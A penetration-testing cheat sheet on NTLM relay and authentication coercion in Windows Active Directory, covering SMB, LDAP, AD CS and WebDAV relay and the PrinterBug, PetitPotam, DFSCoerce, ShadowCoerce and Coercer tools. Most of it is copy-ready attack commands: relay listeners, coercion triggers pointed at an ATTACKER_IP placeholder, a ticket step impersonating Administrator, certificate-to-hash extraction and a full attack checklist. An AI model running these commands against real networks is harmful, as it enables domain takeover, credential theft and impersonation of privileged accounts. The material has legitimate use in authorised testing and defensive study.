# NTLM Relay and Coercion

NTLM relay and coercion techniques abuse the way Windows systems authenticate to network services.

The general idea is:

```text
Victim authenticates to attacker
Attacker relays NTLM authentication to target service
Target accepts authentication
Attacker performs action as the relayed identity
```

Authentication coercion is often used to force or trigger a machine or user to authenticate to the attacker-controlled listener.

Useful resources:

- [The Hacker Recipes - NTLM Relay](https://www.thehacker.recipes/ad/movement/ntlm/relay)
- [HackTricks - Active Directory Methodology](https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html)
- [HackTricks - Printer Spooler Service Abuse](https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/printers-spooler-service-abuse.html)
- [NetExec - SMB Signing Not Required](https://www.netexec.wiki/smb-protocol/enumeration/smb-signing-not-required)
- [Impacket ntlmrelayx](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py)
- [Coercer](https://github.com/p0dalirius/Coercer)
- [PetitPotam](https://github.com/topotam/PetitPotam)
- [DFSCoerce](https://github.com/Wh04m1001/DFSCoerce)
- [ShadowCoerce](https://github.com/ShutdownRepo/ShadowCoerce)
- [Dirk-jan Mollema - NTLM relaying to AD CS](https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/)
- [BloodHound - Coerce and Relay NTLM to AD CS](https://bloodhound.specterops.io/resources/edges/coerce-and-relay-ntlm-to-adcs)
- [WADComs - Impacket NTLMRelayX](https://wadcoms.github.io/wadcoms/Impacket-NTLMRelayX/)

Basic variables used in examples:

```bash
export DOMAIN=corp.local
export NETBIOS=CORP
export USER=alice
export PASS='Password123!'
export DC_IP=10.10.10.10
export DC_HOST=dc01.corp.local
export ATTACKER_IP=10.10.14.5
export TARGET=10.10.10.20
export TARGET_HOST=filesrv01.corp.local
export RANGE=10.10.10.0/24
```

---

## NTLM Relay Basics

NTLM relay abuses NTLM authentication messages.

It is not the same as Pass-the-Hash.

| Technique | Meaning |
| --- | --- |
| Pass-the-Hash | Uses an NT hash directly to authenticate. |
| NTLM relay | Captures an NTLM authentication exchange and relays it to another service. |
| NetNTLM capture | Captures challenge-response material for offline cracking. |
| Coercion | Forces or triggers a target to authenticate to an attacker-controlled listener. |

Relay flow:

```text
1. Attacker starts listener.
2. Victim authenticates to attacker over SMB/HTTP/etc.
3. Attacker forwards NTLM messages to target service.
4. Target service accepts authentication if conditions allow it.
5. Attacker performs actions as the relayed identity.
```

Common relay protocols:

| Incoming | Relayed to |
| --- | --- |
| SMB | SMB |
| SMB | LDAP / LDAPS |
| SMB | HTTP |
| HTTP | LDAP / LDAPS |
| HTTP | AD CS HTTP endpoint |
| WebDAV / HTTP | LDAP / SMB / AD CS |
| MSSQL | SMB / LDAP / HTTP, depending on tooling and context |

Common targets:

| Target | Possible impact |
| --- | --- |
| SMB host without signing required | File access, command execution if relayed identity is local admin. |
| LDAP / LDAPS | Add computer, RBCD, shadow credentials, group modification, ACL changes. |
| AD CS web enrollment | Certificate request as relayed machine or user. |
| HTTP service with NTLM | Application-specific authenticated access. |
| MSSQL | Database access if relayed identity has rights. |

Common blockers:

| Blocker | Effect |
| --- | --- |
| SMB signing required | Blocks SMB relay to SMB. |
| LDAP signing/channel binding | Blocks or limits LDAP relay. |
| EPA / channel binding on HTTP | Can block some HTTP relay paths. |
| Protected Users / sensitive accounts | Delegation and some auth flows may be limited. |
| No useful target rights | Relay authenticates but action fails. |
| Kerberos used instead of NTLM | NTLM relay path may not trigger. |

Check SMB signing:

```bash
nxc smb $RANGE --gen-relay-list relay_targets.txt
```

Manual SMB signing check:

```bash
nmap -Pn -n -p445 --script smb2-security-mode $TARGET
```

Start basic ntlmrelayx with a single SMB target:

```bash
ntlmrelayx.py -t smb://$TARGET --smb2support
```

Relay to target list:

```bash
ntlmrelayx.py -tf relay_targets.txt --smb2support
```

Start SOCKS mode:

```bash
ntlmrelayx.py -tf relay_targets.txt --smb2support -socks
```

Interactive ntlmrelayx shell:

```bash
ntlmrelayx.py -tf relay_targets.txt --smb2support -i
```

Common ntlmrelayx options:

| Option | Meaning |
| --- | --- |
| `-t` | Single relay target. |
| `-tf` | File with relay targets. |
| `--smb2support` | Enable SMB2 support. |
| `-socks` | Start SOCKS proxy for relayed sessions. |
| `-i` | Interactive shell for supported protocols. |
| `--no-smb-server` | Do not start SMB listener. |
| `--no-http-server` | Do not start HTTP listener. |
| `--delegate-access` | LDAP/RBCD style delegation action. |
| `--add-computer` | Add computer account through LDAP relay. |
| `--escalate-user` | Try privilege escalation against LDAP target. |
| `--dump` | Dump LDAP information where supported. |
| `--adcs` | AD CS relay mode. |
| `--template` | Certificate template name for AD CS relay. |

---

## SMB Relay

SMB relay usually means relaying NTLM authentication to SMB on another host.

It requires the SMB target to not require SMB signing.

Find relayable SMB hosts:

```bash
nxc smb $RANGE --gen-relay-list relay_targets.txt
```

Check one host:

```bash
nxc smb $TARGET
nmap -Pn -n -p445 --script smb2-security-mode $TARGET
```

Expected interesting condition:

```text
SMB signing: False / not required
```

Relay to one SMB target:

```bash
ntlmrelayx.py -t smb://$TARGET --smb2support
```

Relay to a list:

```bash
ntlmrelayx.py -tf relay_targets.txt --smb2support
```

Relay and get interactive shell where supported:

```bash
ntlmrelayx.py -t smb://$TARGET --smb2support -i
```

Relay with command execution when the relayed identity is local admin:

```bash
ntlmrelayx.py -t smb://$TARGET --smb2support -c "whoami"
```

Relay to multiple SMB targets:

```bash
cat relay_targets.txt
```

Example target file:

```text
smb://10.10.10.20
smb://10.10.10.21
smb://10.10.10.22
```

Run:

```bash
ntlmrelayx.py -tf relay_targets.txt --smb2support
```

Trigger authentication separately with a coercion method.

Simple test trigger from a controlled Windows host:

```cmd
dir \\ATTACKER_IP\share
```

If using responder-style poisoning in labs, avoid running tools that conflict with ntlmrelayx listeners on the same ports.

Common conflicts:

| Port | Service |
| --- | --- |
| `445` | SMB listener. |
| `80` | HTTP listener. |
| `443` | HTTPS listener. |

SMB relay outcomes:

| Result | Meaning |
| --- | --- |
| Authentication received | Victim connected to attacker listener. |
| Relay failed: signing required | SMB target requires signing. |
| Relay succeeds but no command | Relayed identity is not local admin. |
| Command executes | Relayed identity has admin rights on target. |
| Session created | Use interactive or SOCKS flow. |


---

## LDAP Relay

LDAP relay targets LDAP or LDAPS on a domain controller.

LDAP relay is interesting because the relayed identity may be able to perform AD object operations.

Possible LDAP relay actions depend on the relayed account privileges and server protections.

Common LDAP relay objectives:

| Objective | Notes |
| --- | --- |
| Add computer account | Depends on MachineAccountQuota and permissions. |
| Set RBCD | Often used with `--delegate-access`. |
| Shadow credentials | Add key credential link if rights allow. |
| Modify group membership | Requires rights over group. |
| Modify ACL | Requires rights. |
| Dump LDAP information | Enumeration if relay succeeds. |

Check domain context:

```bash
nxc ldap $DC_IP -u $USER -p "$PASS" -d $DOMAIN
```

Check MachineAccountQuota:

```bash
nxc ldap $DC_IP -u $USER -p "$PASS" -d $DOMAIN -M maq
```

LDAP relay basic:

```bash
ntlmrelayx.py -t ldap://$DC_IP --smb2support
```

LDAPS relay:

```bash
ntlmrelayx.py -t ldaps://$DC_IP --smb2support
```

Relay and dump LDAP info:

```bash
ntlmrelayx.py -t ldap://$DC_IP --smb2support --dump
```

Relay with SOCKS:

```bash
ntlmrelayx.py -t ldap://$DC_IP --smb2support -socks
```

Add computer through LDAP relay:

```bash
ntlmrelayx.py -t ldap://$DC_IP --smb2support --add-computer 'ATTACKBOX$' 'MachinePass123!'
```

RBCD-style delegation through LDAP relay:

```bash
ntlmrelayx.py -t ldap://$DC_IP --smb2support --delegate-access
```

LDAPS version:

```bash
ntlmrelayx.py -t ldaps://$DC_IP --smb2support --delegate-access
```

Relay to LDAP with escalation user:

```bash
ntlmrelayx.py -t ldap://$DC_IP --smb2support --escalate-user $USER
```

After successful RBCD-style path, request service ticket:

```bash
getST.py -spn cifs/$TARGET_HOST -impersonate Administrator $DOMAIN/'ATTACKBOX$':'MachinePass123!' -dc-ip $DC_IP
```

Use ticket:

```bash
export KRB5CCNAME=$PWD/Administrator.ccache
smbclient.py -k -no-pass $DOMAIN/Administrator@$TARGET_HOST
```

LDAP relay blockers:

| Blocker | Meaning |
| --- | --- |
| LDAP signing required | LDAP relay may fail. |
| Channel binding required | LDAPS relay may fail. |
| Relayed account lacks rights | Relay authenticates but action fails. |
| MachineAccountQuota is 0 | Add-computer path may fail. |
| Target user protected | Some delegation paths fail. |


---

## ADCS Relay

AD CS relay commonly targets certificate enrollment HTTP endpoints.

The classic path is often called ESC8.

General idea:

```text
Coerce machine authentication
Relay NTLM to AD CS web enrollment
Request certificate as machine
Use certificate for domain authentication
```

Common AD CS HTTP endpoints:

```text
http://ca01.corp.local/certsrv/
http://ca01.corp.local/certsrv/certfnsh.asp
```

Find AD CS with Certipy:

```bash
certipy find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip $DC_IP -v
```

Find vulnerable templates and endpoints:

```bash
certipy find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip $DC_IP -vulnerable
```

NetExec AD CS module:

```bash
nxc ldap $DC_IP -u $USER -p "$PASS" -d $DOMAIN -M adcs
```

Relay to AD CS with ntlmrelayx:

```bash
ntlmrelayx.py -t http://ca01.corp.local/certsrv/certfnsh.asp --adcs --template Machine --smb2support
```

Use DomainController template for relayed DC machine account where applicable in labs:

```bash
ntlmrelayx.py -t http://ca01.corp.local/certsrv/certfnsh.asp --adcs --template DomainController --smb2support
```

Use a target file:

```text
http://ca01.corp.local/certsrv/certfnsh.asp
```

Run:

```bash
ntlmrelayx.py -tf adcs_targets.txt --adcs --template Machine --smb2support
```

Coerce authentication from a machine to attacker listener, then relay to AD CS.

If certificate is issued, ntlmrelayx may save it as:

```text
*.pfx
*.pem
```

Authenticate with Certipy using PFX:

```bash
certipy auth -pfx machine.pfx -dc-ip $DC_IP
```

This can return:

```text
TGT
NT hash
ccache
```

Use ccache:

```bash
export KRB5CCNAME=$PWD/machine.ccache
klist
```

Use machine account access:

```bash
nxc smb $DC_HOST -k --use-kcache
```

AD CS relay conditions:

| Condition | Why it matters |
| --- | --- |
| AD CS HTTP endpoint exists | Relay target. |
| NTLM accepted on endpoint | Required for relay. |
| Template allows machine/user enrollment | Certificate issuance path. |
| Relayed identity has enroll rights | Needed for certificate request. |
| EPA/channel binding not blocking | Required for some HTTP relay paths. |
| Useful template | `Machine`, `DomainController`, or other valid template. |


---

## WebDAV Relay

WebDAV can be useful because Windows may authenticate over HTTP/WebDAV instead of SMB.

This can matter when SMB outbound is blocked, SMB signing prevents SMB relay, or WebClient service behavior allows HTTP-based authentication.

Important Windows component:

```text
WebClient service
```

Common WebDAV relay idea:

```text
Victim authenticates to attacker over HTTP/WebDAV
Attacker relays NTLM to LDAP / AD CS / HTTP target
```

Check if WebClient service may be running from Windows:

```cmd
sc query WebClient
```

Remote checks may vary by access and environment.

Start HTTP relay listener without SMB listener if needed:

```bash
ntlmrelayx.py -t ldap://$DC_IP --no-smb-server
```

HTTP to LDAPS:

```bash
ntlmrelayx.py -t ldaps://$DC_IP --no-smb-server --delegate-access
```

HTTP to AD CS:

```bash
ntlmrelayx.py -t http://ca01.corp.local/certsrv/certfnsh.asp --adcs --template Machine --no-smb-server
```

WebDAV UNC-style path examples:

```text
\\ATTACKER_IP@80\share
\\attacker-host@80\share
```

From a controlled Windows host:

```cmd
dir \\ATTACKER_IP@80\share
```

HTTP server considerations:

| Item | Notes |
| --- | --- |
| Port 80 | Common WebDAV/HTTP listener port. |
| Hostname | Some auth behavior differs by hostname/IP. |
| WebClient | Needed for WebDAV-style UNC HTTP access. |
| WebDAV coercion | Some coercion techniques can trigger HTTP auth. |
| LDAP/AD CS target | Common relay target. |

Common outcomes:

| Result | Meaning |
| --- | --- |
| HTTP auth received | Victim connected to HTTP listener. |
| Relay to LDAP succeeds | LDAP action may be possible. |
| Relay to AD CS succeeds | Certificate may be issued. |
| No auth received | WebClient not running, trigger failed, or name/path issue. |
| Falls back to SMB | Path or service behavior did not use WebDAV. |


---

## Coercion Primitives

Authentication coercion forces or triggers a remote Windows machine to authenticate to an attacker-controlled listener.

Common target identity:

```text
MACHINE$ account
```

Example:

```text
DC01$ authenticates to attacker
Attacker relays DC01$ to AD CS
Certificate is requested as DC01$
```

Common coercion protocols and interfaces:

| Primitive | Interface / idea |
| --- | --- |
| PrinterBug | MS-RPRN / Print Spooler. |
| PetitPotam | MS-EFSRPC. |
| DFSCoerce | MS-DFSNM. |
| ShadowCoerce | MS-FSRVP. |
| WebDAV coercion | HTTP/WebClient-based auth path. |
| Coercer | Multi-method coercion framework. |

General coercion flow:

```text
1. Start relay listener.
2. Trigger coercion from victim to attacker.
3. Victim authenticates to listener.
4. ntlmrelayx relays authentication to target.
5. Action is performed as victim identity.
```

Listener example:

```bash
ntlmrelayx.py -t ldap://$DC_IP --smb2support
```

AD CS listener example:

```bash
ntlmrelayx.py -t http://ca01.corp.local/certsrv/certfnsh.asp --adcs --template Machine --smb2support
```

Coercion usually needs:

| Requirement | Notes |
| --- | --- |
| Network reachability | Victim must reach attacker listener. |
| Target protocol exposed | RPC/SMB/HTTP path depending on method. |
| Valid credentials | Many coercion methods require domain credentials. |
| Service enabled | Example: Print Spooler for PrinterBug. |
| Relay target vulnerable | Relay must succeed after authentication arrives. |

Authentication listener check:

```bash
sudo responder -I tun0 -A
```

This can confirm whether authentication is received, but do not run Responder on the same ports as ntlmrelayx during relay unless configured to avoid conflicts.

Port conflicts:

| Tool behavior | Ports |
| --- | --- |
| SMB listener | `445` |
| HTTP listener | `80` |
| HTTPS listener | `443` |
| Responder SMB/HTTP | Can conflict with ntlmrelayx. |

Common coercion result meanings:

| Result | Meaning |
| --- | --- |
| Authentication arrives | Coercion worked at least to listener. |
| Relay succeeds | Target accepted relayed auth. |
| Relay fails due to signing | Target protocol protection blocked action. |
| Coercion fails | Service disabled, patched, blocked, or wrong method. |
| Access denied | Credentials insufficient for coercion call or relay action. |


---

## PrinterBug

PrinterBug abuses the Print Spooler RPC interface to trigger authentication from a target machine.

It is often associated with MS-RPRN.

Common target:

```text
Computer account of the coerced machine
```

Example:

```text
DC01$ -> authenticates to attacker
```

Requirements:

| Requirement | Notes |
| --- | --- |
| Print Spooler running | Target must expose spooler behavior. |
| Network reachability | Target must reach attacker listener. |
| Credentials | Usually requires domain credentials. |
| Relay listener | ntlmrelayx or capture listener. |

Check spooler with rpcdump:

```bash
rpcdump.py @$TARGET | grep -i MS-RPRN
```

Check with NetExec module if available in environment:

```bash
nxc smb $TARGET -u $USER -p "$PASS" -d $DOMAIN -M spooler
```

Start relay listener:

```bash
ntlmrelayx.py -t smb://$TARGET_HOST --smb2support
```

For AD CS relay:

```bash
ntlmrelayx.py -t http://ca01.corp.local/certsrv/certfnsh.asp --adcs --template Machine --smb2support
```

Trigger with printerbug-style tooling:

```bash
printerbug.py "$DOMAIN/$USER:$PASS@$TARGET" $ATTACKER_IP
```

Alternative syntax used by some builds:

```bash
python3 printerbug.py "$DOMAIN/$USER:$PASS@$TARGET" $ATTACKER_IP
```

If using hash authentication:

```bash
printerbug.py "$DOMAIN/$USER@$TARGET" $ATTACKER_IP -hashes :$NTLM
```

Expected incoming identity:

```text
TARGETHOST$
```

Example:

```text
DC01$
FILESERV01$
```

Good targets:

| Target | Why interesting |
| --- | --- |
| Domain Controller | Machine account can be high-value in AD CS relay. |
| File server | May have useful rights or sessions. |
| Unconstrained delegation host | Can combine with ticket capture paths. |
| CA server | Certificate services context. |

Common failures:

| Error | Possible meaning |
| --- | --- |
| No auth received | Spooler disabled, blocked, or wrong listener. |
| Access denied | Credentials cannot call required interface. |
| Relay fails | Relay target protections or rights issue. |
| Hostname issue | Try FQDN, short name, or IP depending on context. |


---

## PetitPotam

PetitPotam abuses MS-EFSRPC behavior to coerce authentication from a target to an attacker-controlled listener.

It is commonly associated with coercing machine account authentication and relaying it to AD CS or LDAP in lab environments.

Requirements:

| Requirement | Notes |
| --- | --- |
| Reachable EFSRPC interface | Target must expose usable RPC path. |
| Network reachability | Target must reach attacker. |
| Credentials | Some modes require credentials depending on environment. |
| Relay target | LDAP/AD CS/SMB depending on objective. |

Start AD CS relay listener:

```bash
ntlmrelayx.py -t http://ca01.corp.local/certsrv/certfnsh.asp --adcs --template Machine --smb2support
```

Start LDAP relay listener:

```bash
ntlmrelayx.py -t ldap://$DC_IP --smb2support --delegate-access
```

Trigger PetitPotam:

```bash
python3 PetitPotam.py -d $DOMAIN -u $USER -p "$PASS" $ATTACKER_IP $TARGET
```

Against DC:

```bash
python3 PetitPotam.py -d $DOMAIN -u $USER -p "$PASS" $ATTACKER_IP $DC_IP
```

With hash if supported by the local tool version:

```bash
python3 PetitPotam.py -d $DOMAIN -u $USER -H $NTLM $ATTACKER_IP $TARGET
```

Unauthenticated mode may work in some old or intentionally vulnerable lab setups:

```bash
python3 PetitPotam.py $ATTACKER_IP $TARGET
```

Expected incoming identity:

```text
TARGETHOST$
```

Common PetitPotam targets:

| Target | Why interesting |
| --- | --- |
| Domain Controller | AD CS relay may produce DC certificate if conditions allow. |
| File server | Machine account relay target. |
| CA server | Certificate service environment context. |
| Any domain server | Machine authentication source. |

Common failures:

| Error | Possible meaning |
| --- | --- |
| `STATUS_ACCESS_DENIED` | Method requires auth or blocked. |
| No auth received | Target not vulnerable/reachable or wrong method. |
| Relay fails | AD CS/LDAP target protection or template issue. |
| RPC error | Interface unavailable or patched behavior. |


---

## DFSCoerce

DFSCoerce abuses Distributed File System Namespace Management RPC behavior to coerce authentication.

It is associated with MS-DFSNM.

Requirements:

| Requirement | Notes |
| --- | --- |
| DFS Namespace Management interface | Target exposes required RPC interface. |
| Credentials | Usually domain credentials. |
| Listener | ntlmrelayx or capture listener. |
| Relay target | SMB/LDAP/AD CS depending on objective. |

Start listener:

```bash
ntlmrelayx.py -t ldap://$DC_IP --smb2support --delegate-access
```

AD CS listener:

```bash
ntlmrelayx.py -t http://ca01.corp.local/certsrv/certfnsh.asp --adcs --template Machine --smb2support
```

Trigger DFSCoerce:

```bash
python3 dfscoerce.py -d $DOMAIN -u $USER -p "$PASS" $TARGET $ATTACKER_IP
```

Alternative syntax used by some repositories:

```bash
python3 dfscoerce.py -u $USER -p "$PASS" -d $DOMAIN $TARGET $ATTACKER_IP
```

With NTLM hash if supported by the build:

```bash
python3 dfscoerce.py -d $DOMAIN -u $USER -H $NTLM $TARGET $ATTACKER_IP
```

Expected incoming identity:

```text
TARGETHOST$
```

Useful test listener:

```bash
sudo responder -I tun0 -A
```

Do not run Responder on SMB/HTTP ports at the same time as ntlmrelayx unless intentionally configured.

Common failures:

| Error | Possible meaning |
| --- | --- |
| Access denied | Credentials or RPC restrictions. |
| No auth received | Method not working against target. |
| RPC unavailable | DFSNM interface unavailable. |
| Relay failed | Relay target protection issue. |


---

## ShadowCoerce

ShadowCoerce abuses File Server Remote VSS Protocol behavior to coerce authentication.

It is associated with MS-FSRVP.

Requirements:

| Requirement | Notes |
| --- | --- |
| FSRVP interface | Target exposes required RPC interface. |
| Credentials | Usually domain credentials. |
| Listener | ntlmrelayx or capture listener. |
| Relay target | SMB/LDAP/AD CS depending on objective. |

Start relay listener:

```bash
ntlmrelayx.py -t ldap://$DC_IP --smb2support --delegate-access
```

AD CS listener:

```bash
ntlmrelayx.py -t http://ca01.corp.local/certsrv/certfnsh.asp --adcs --template Machine --smb2support
```

Trigger ShadowCoerce:

```bash
python3 shadowcoerce.py -d $DOMAIN -u $USER -p "$PASS" $TARGET $ATTACKER_IP
```

Alternative syntax:

```bash
python3 shadowcoerce.py $DOMAIN/$USER:"$PASS"@$TARGET $ATTACKER_IP
```

With NTLM hash if supported by the build:

```bash
python3 shadowcoerce.py -d $DOMAIN -u $USER -H $NTLM $TARGET $ATTACKER_IP
```

Expected incoming identity:

```text
TARGETHOST$
```

Common target types:

| Target | Notes |
| --- | --- |
| File servers | More likely to expose file-service-related interfaces. |
| Backup servers | May expose VSS-related functionality. |
| Windows servers | Worth testing in labs if in scope. |
| DCs | High-value if coercion and relay path work. |

Common failures:

| Error | Possible meaning |
| --- | --- |
| RPC error | Interface unavailable. |
| Access denied | Credentials or service restrictions. |
| No auth received | Coercion failed. |
| Relay failed | Target service protections or rights issue. |

---

## Coercer

Coercer is a tool that automatically tests multiple authentication coercion methods.

It can scan a target for coercion vectors and trigger authentication to an attacker-controlled listener.

The project describes itself as a Python script to coerce a Windows server to authenticate to an arbitrary machine through multiple methods.

Common use:

```text
Find which coercion methods work against a target
Trigger authentication while ntlmrelayx is listening
Document working primitives
```

Basic scan:

```bash
coercer scan -t $TARGET -u $USER -p "$PASS" -d $DOMAIN
```

Specify listener:

```bash
coercer coerce -t $TARGET -l $ATTACKER_IP -u $USER -p "$PASS" -d $DOMAIN
```

Use hash if supported:

```bash
coercer coerce -t $TARGET -l $ATTACKER_IP -u $USER -H $NTLM -d $DOMAIN
```

Scan multiple targets:

```bash
coercer scan -f targets.txt -u $USER -p "$PASS" -d $DOMAIN
```

Coerce multiple targets:

```bash
coercer coerce -f targets.txt -l $ATTACKER_IP -u $USER -p "$PASS" -d $DOMAIN
```

Start relay first:

```bash
ntlmrelayx.py -t ldap://$DC_IP --smb2support --delegate-access
```

Then trigger Coercer:

```bash
coercer coerce -t $TARGET -l $ATTACKER_IP -u $USER -p "$PASS" -d $DOMAIN
```

Use with AD CS relay:

```bash
ntlmrelayx.py -t http://ca01.corp.local/certsrv/certfnsh.asp --adcs --template Machine --smb2support
coercer coerce -t $TARGET -l $ATTACKER_IP -u $USER -p "$PASS" -d $DOMAIN
```

Coercer output to save:

| Output | Why it matters |
| --- | --- |
| Working method | Exact coercion primitive. |
| RPC interface | Protocol context. |
| Auth received | Confirms coercion. |
| Failed methods | Avoid retrying noisy methods. |
| Target identity | Machine account or user. |

Common workflow:

```text
1. Identify relay target.
2. Start ntlmrelayx.
3. Run Coercer against victim.
4. Watch for authentication.
5. Check relay result.
6. Save working method and output.
```


---

## Relay Checklist

- [ ] **Basic context**

  ```text
  Domain:
  DC:
  CA server:
  Attacker IP:
  Target range:
  Current credential:
  ```

- [ ] **Identify relayable SMB targets**

  ```bash
  nxc smb $RANGE --gen-relay-list relay_targets.txt
  cat relay_targets.txt
  ```

  Record:

  ```text
  SMB signing not required:
  Potential SMB relay targets:
  High-value hosts:
  ```

- [ ] **Identify LDAP / LDAPS target**

  ```bash
  nxc ldap $DC_IP -u $USER -p "$PASS" -d $DOMAIN
  ```

  Record:

  ```text
  LDAP:
  LDAPS:
  Signing/channel binding notes:
  MachineAccountQuota:
  ```

- [ ] **Identify AD CS**

  ```bash
  certipy find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip $DC_IP -vulnerable
  nxc ldap $DC_IP -u $USER -p "$PASS" -d $DOMAIN -M adcs
  ```

  Record:

  ```text
  CA:
  HTTP endpoint:
  Templates:
  ESC8-like path:
  ```

- [ ] **Start relay listener**

  SMB relay:

  ```bash
  ntlmrelayx.py -tf relay_targets.txt --smb2support
  ```

  LDAP relay:

  ```bash
  ntlmrelayx.py -t ldap://$DC_IP --smb2support --delegate-access
  ```

  AD CS relay:

  ```bash
  ntlmrelayx.py -t http://ca01.corp.local/certsrv/certfnsh.asp --adcs --template Machine --smb2support
  ```

  SOCKS:

  ```bash
  ntlmrelayx.py -tf relay_targets.txt --smb2support -socks
  ```

- [ ] **Trigger coercion**

  PrinterBug:

  ```bash
  printerbug.py "$DOMAIN/$USER:$PASS@$TARGET" $ATTACKER_IP
  ```

  PetitPotam:

  ```bash
  python3 PetitPotam.py -d $DOMAIN -u $USER -p "$PASS" $ATTACKER_IP $TARGET
  ```

  DFSCoerce:

  ```bash
  python3 dfscoerce.py -d $DOMAIN -u $USER -p "$PASS" $TARGET $ATTACKER_IP
  ```

  ShadowCoerce:

  ```bash
  python3 shadowcoerce.py -d $DOMAIN -u $USER -p "$PASS" $TARGET $ATTACKER_IP
  ```

  Coercer:

  ```bash
  coercer coerce -t $TARGET -l $ATTACKER_IP -u $USER -p "$PASS" -d $DOMAIN
  ```

- [ ] **Confirm incoming identity**

  Record:

  ```text
  Incoming identity:
  Source host:
  Protocol:
  Timestamp:
  Coercion method:
  ```

  Expected examples:

  ```text
  DC01$
  FILESERV01$
  WEB01$
  CORP\alice
  ```

- [ ] **Confirm relay result**

  Record:

  ```text
  Relay target:
  Relay protocol:
  Action:
  Success:
  Error:
  Output:
  ```

  Common results:

  | Result | Meaning |
  | --- | --- |
  | Auth received but no relay | Listener or target configuration issue. |
  | Relay blocked by signing | Target requires signing. |
  | LDAP action failed | Insufficient rights or protections. |
  | Certificate issued | AD CS relay success. |
  | Session created | Use interactive or SOCKS path. |
  | Command executed | Relayed identity had local admin on SMB target. |

- [ ] **Post-relay actions**

  If AD CS certificate obtained:

  ```bash
  certipy auth -pfx machine.pfx -dc-ip $DC_IP
  ```

  If RBCD set:

  ```bash
  getST.py -spn cifs/$TARGET_HOST -impersonate Administrator $DOMAIN/'ATTACKBOX$':'MachinePass123!' -dc-ip $DC_IP
  export KRB5CCNAME=$PWD/Administrator.ccache
  ```

  If SOCKS session exists:

  ```bash
  proxychains nxc smb $TARGET -u relayed -p ''
  ```

  If SMB command execution worked:

  ```text
  Save command output and identify resulting access.
  ```

